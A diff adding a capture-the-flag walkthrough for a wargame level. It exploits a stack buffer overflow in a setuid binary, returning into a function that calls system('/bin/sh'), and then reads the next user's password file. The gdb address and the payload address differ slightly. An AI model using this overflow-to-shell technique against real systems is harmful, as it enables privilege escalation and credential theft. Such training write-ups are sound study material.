@@ -1,0 +1,45 @@
+level1 walkthrough
+==================
+
+1. 
+$ ls -la
+-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
+
+2.
+$ ./level1
+//waiting for input
+
+3. ghidra usage 
+
+find that can overflow the char*
+
+4.
+$ (head -c 76 < /dev/zero | tr '\0' 'A') | ./level1 
+Illegal instruction (core dumped)
+
+so need to give after an address which will be called
+at first I try to give address of system and then the address of "/bin/sh" but it doesn't work
+so I find the run function which have call system("/bin/sh") and I give the address of that function
+
+5.
+$ gdb ./level1
+(gdb) x/s run 
+0x8048444 <run>: *
+
+6.
+$ (head -c 76 < /dev/zero | tr '\0' 'A'; printf '\x4a\x84\x04\x08') | ./level1
+Good... Wait what?
+Segmentation fault (core dumped)
+
+so its called but it segfaults, so we need to stay the shell opened
+
+7.
+$ (head -c 76 < /dev/zero | tr '\0' 'A'; printf '\x4a\x84\x04\x08') > /tmp/input
+$ (cat /tmp/input; cat) | ./level1
+//shell will be opened
+$ whoami
+level2
+$ cd ../
+$ cd level2
+$ ls -la
+$ cat .pass 
